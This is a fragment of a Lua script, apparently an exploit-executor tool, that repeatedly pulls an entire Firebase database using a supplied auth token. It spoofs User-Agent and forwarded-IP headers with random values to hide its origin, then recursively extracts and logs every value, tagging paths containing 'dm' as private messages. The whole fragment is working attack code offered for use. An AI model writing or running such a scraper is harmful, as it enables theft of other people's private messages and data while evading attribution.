-- 2. SILENT MEMORY CRAWLER (NO HOOKS)
-- ========================================== --
local function BruteForceExtract(data, path)
    if type(data) ~= "table" then return end
    for k, v in pairs(data) do
        local currentPath = path .. "/" .. tostring(k)
        if type(v) == "table" then
            BruteForceExtract(v, currentPath)
        else
            local valStr = tostring(v)
            if #valStr > 0 and not valStr:find("firebase") then
                local dataId = currentPath .. valStr
                if not processedData[dataId] then
                    processedData[dataId] = true
                    local tag = tostring(k)
                    if #tostring(k) > 8 and tonumber(k) then tag = "SERVER_ID" end
                    if currentPath:lower():find("dm") then tag = "PRIVATE_MSG" end
                    AddLog(tag, valStr)
                end
            end
        end
    end
end

local function StartShadowSync()
    task.spawn(function()
        while task.wait(1.5) do
            if TARGET_URL and TARGET_AUTH then
                pcall(function()
                    -- ROTATING IDENTITY HEADERS (SPOOFED)
                    local res = request({
                        Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                        Method = "GET",
                        Headers = {
                            ["User-Agent"] = "F0RBID_SPECTRE_v21_" .. tostring(math.random(100, 999)),
                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
                            ["X-Real-IP"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
                            ["Identity-Shift"] = "ENABLED"
                        }
                    })
                    if res.Success then
                        local decoded = HttpService:JSONDecode(res.Body)
                        if decoded then BruteForceExtract(decoded, "SPECTRE") end
                    end
                end)
            end
        end
    end)
end

